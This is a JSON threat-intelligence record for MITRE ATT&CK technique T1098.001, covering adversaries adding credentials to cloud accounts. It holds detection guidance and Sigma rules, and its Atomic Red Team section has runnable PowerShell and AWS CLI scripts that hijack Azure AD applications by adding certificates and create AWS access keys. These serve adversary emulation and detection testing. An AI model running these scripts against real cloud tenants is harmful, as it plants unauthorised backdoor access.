{
    "id": "T1098.001",
    "name": "Additional Cloud Credentials",
    "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\nAdversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](T1078.004), adversaries may generate or import their own SSH keys using either the `CreateKeyPair` or `ImportKeyPair` API in AWS or the `gcloud compute os-login ssh-keys add` command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)",
    "platforms": "IaaS, Azure AD",
    "kill_chain_phases": "Persistence",
    "data_sources": "User Account: User Account Modification, Active Directory: Active Directory Object Modification",
    "detection": "Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.",
    "url": "https://attack.mitre.org/techniques/T1098/001",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "8a2f40cf-8325-47f9-96e4-b1ca4c7389bd",
                    "cbb67ecc-fb70-4467-9350-c910bdf7c628",
                    "eaa9ac35-1730-441f-9587-25767bde99d7",
                    "25adc94b-5b29-44fe-a4a8-c89d17ff3566"
                ],
                "lookup_results": [
                    {
                        "uuid": "8a2f40cf-8325-47f9-96e4-b1ca4c7389bd",
                        "lookup_data": {
                            "mitre-attack-id": "T1098.001",
                            "mitre-cti:description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)",
                            "mitre-cti:name": "Additional Cloud Credentials",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-24T15:20:47.020Z', 'name': 'Additional Cloud Credentials', 'description': 'Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\\n\\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\\n\\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\\n\\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}], 'x_mitre_detection': 'Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\\n\\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.', 'x_mitre_platforms': ['IaaS', 'Azure AD', 'SaaS'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '2.4', 'x_mitre_contributors': ['Expel', 'Oleg Kolesnikov, Securonix', 'Jannie Li, Microsoft Threat Intelligence\\u202fCenter\\u202f(MSTIC)', 'Zur Ulianitzky, XM Cyber', 'Alex Soler, AttackIQ'], 'x_mitre_data_sources': ['Active Directory: Active Directory Object Modification', 'User Account: User Account Modification'], 'type': 'attack-pattern', 'id': 'attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd', 'created': '2020-01-19T16:10:15.008Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1098/001', 'external_id': 'T1098.001'}, {'source_name': 'Expel IO Evil in AWS', 'description': 'A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.', 'url': 'https://expel.io/blog/finding-evil-in-aws/'}, {'source_name': 'Demystifying Azure AD Service Principals', 'description': 'Bellavance, Ned. (2019, July 16). Demystifying Azure AD Service Principals. Retrieved January 19, 2020.', 'url': 'https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/'}, {'source_name': 'GCP SSH Key Add', 'description': 'Google. (n.d.). gcloud compute os-login ssh-keys add. Retrieved October 1, 2020.', 'url': 'https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add'}, {'source_name': 'Blue Cloud of Death Video', 'description': 'Kunz, Bruce. (2018, October 14). Blue Cloud of Death: Red Teaming Azure. Retrieved November 21, 2019.', 'url': 'https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815'}, {'source_name': 'Blue Cloud of Death', 'description': 'Kunz, Bryce. (2018, May 11). Blue Cloud of Death: Red Teaming Azure. Retrieved October 23, 2019.', 'url': 'https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1'}, {'source_name': 'Microsoft SolarWinds Customer Guidance', 'description': 'MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 17, 2020.', 'url': 'https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/'}, {'source_name': 'Expel Behind the Scenes', 'description': 'S. Lipton, L. Easterly, A. Randazzo and J. Hencinski. (2020, July 28). Behind the scenes in the Expel SOC: Alert-to-fix in AWS. Retrieved October 1, 2020.', 'url': 'https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/'}, {'source_name': 'Rhino Security Labs AWS Privilege Escalation', 'description': 'Spencer Gietzen. (n.d.). AWS IAM Privilege Escalation â€“ Methods and Mitigation. Retrieved May 27, 2022.', 'url': 'https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cbb67ecc-fb70-4467-9350-c910bdf7c628",
                        "lookup_data": {
                            "description": "Detects when a new credential is added to an existing application. Any additional credentials added outside of expected processes could be a malicious actor using those credentials.",
                            "raw": "author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik'\ndate: 2022/05/26\ndescription: Detects when a new credential is added to an existing application. Any\n  additional credentials added outside of expected processes could be a malicious\n  actor using those credentials.\ndetection:\n  condition: selection\n  selection:\n    properties.message:\n    - Update Application-Certificates and secrets management\n    - Update Service principal/Update Application\nfalsepositives:\n- When credentials are added/removed as part of the normal working hours/workflows\nid: cbb67ecc-fb70-4467-9350-c910bdf7c628\nlevel: high\nlogsource:\n  product: azure\n  service: auditlogs\nreferences:\n- https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-applications#application-credentials\nstatus: experimental\ntags:\n- attack.t1098.001\n- attack.persistence\ntitle: Added Credentials to Existing Application\n",
                            "sigma:id": "cbb67ecc-fb70-4467-9350-c910bdf7c628",
                            "title": "Added Credentials to Existing Application",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eaa9ac35-1730-441f-9587-25767bde99d7",
                        "lookup_data": {
                            "description": "Detects when an organization member or an outside collaborator is added to or removed from a project board or has their permission level changed or when an owner removes an outside collaborator from an organization or when two-factor authentication is required in an organization and an outside collaborator does not use 2FA or disables 2FA.\n",
                            "raw": "author: Muhammad Faisal\ndate: 2023/01/20\ndescription: 'Detects when an organization member or an outside collaborator is added\n  to or removed from a project board or has their permission level changed or when\n  an owner removes an outside collaborator from an organization or when two-factor\n  authentication is required in an organization and an outside collaborator does not\n  use 2FA or disables 2FA.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    action:\n    - project.update_user_permission\n    - org.remove_outside_collaborator\nfalsepositives:\n- Validate the actor if permitted to access the repo.\n- Validate the Multifactor Authentication changes.\nfields:\n- action\n- actor\n- org\n- actor_location.country_code\nid: eaa9ac35-1730-441f-9587-25767bde99d7\nlevel: medium\nlogsource:\n  definition: 'Requirements: The audit log streaming feature must be enabled to be\n    able to receive such logs. You can enable following the documentation here: https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/streaming-the-audit-log-for-your-enterprise#setting-up-audit-log-streaming'\n  product: github\n  service: audit\nreferences:\n- https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#audit-log-actions\n- https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-two-factor-authentication-for-your-organization/requiring-two-factor-authentication-in-your-organization\nstatus: experimental\ntags:\n- attack.persistence\n- attack.collection\n- attack.t1098.001\n- attack.t1098.003\n- attack.t1213.003\ntitle: Github Outside Collaborator Detected\n",
                            "sigma:id": "eaa9ac35-1730-441f-9587-25767bde99d7",
                            "title": "Github Outside Collaborator Detected",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
                        "lookup_data": {
                            "description": "UNC3524: Eye Spy on Your Email",
                            "link": "http://www.botvrij.eu/data/feed-osint/25adc94b-5b29-44fe-a4a8-c89d17ff3566.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1652459344",
                            "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1098.001",
                "display_name": "Account Manipulation: Additional Cloud Credentials",
                "atomic_tests": [
                    {
                        "name": "Azure AD Application Hijacking - Service Principal",
                        "auto_generated_guid": "b8e747c3-bdf7-4d71-bce2-f1df2a057406",
                        "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
                        "supported_platforms": [
                            "azure-ad"
                        ],
                        "input_arguments": {
                            "username": {
                                "description": "Azure AD username",
                                "type": "string",
                                "default": "jonh@contoso.com"
                            },
                            "password": {
                                "description": "Azure AD password",
                                "type": "string",
                                "default": "p4sswd"
                            },
                            "service_principal_name": {
                                "description": "Name of the targeted service principal",
                                "type": "string",
                                "default": "SuperSP"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "AzureAD module must be installed.\n",
                                "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
                                "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
                            "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Azure AD Application Hijacking - App Registration",
                        "auto_generated_guid": "a12b5531-acab-4618-a470-0dafb294a87a",
                        "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
                        "supported_platforms": [
                            "azure-ad"
                        ],
                        "input_arguments": {
                            "username": {
                                "description": "Azure AD username",
                                "type": "string",
                                "default": "jonh@contoso.com"
                            },
                            "password": {
                                "description": "Azure AD password",
                                "type": "string",
                                "default": "p4sswd"
                            },
                            "application_name": {
                                "description": "Name of the targeted application",
                                "type": "string",
                                "default": "SuperApp"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "AzureAD module must be installed.\n",
                                "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
                                "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
                            "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "AWS - Create Access Key and Secret Key",
                        "auto_generated_guid": "8822c3b0-d9f9-4daf-a043-491160a31122",
                        "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n",
                        "supported_platforms": [
                            "iaas:aws"
                        ],
                        "input_arguments": {
                            "username": {
                                "description": "Create new AWS access and secret keys for the user",
                                "type": "string",
                                "default": "atomicredteam"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Check if the user exists.\n",
                                "prereq_command": "aws iam list-users | grep #{username}\n",
                                "get_prereq_command": "echo Please run atomic test T1136.003, before running this atomic\n"
                            }
                        ],
                        "executor": {
                            "command": "aws iam create-access-key --user-name #{username} > \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\ncd \"$PathToAtomicsFolder/T1098.001/bin/\"\n./aws_secret.sh\n",
                            "cleanup_command": "access_key=`cat \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\" | jq -r '.AccessKey.AccessKeyId'`\naws iam delete-access-key --access-key-id $access_key --user-name #{username}\nrm \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\n",
                            "name": "sh"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 12:50:46"
}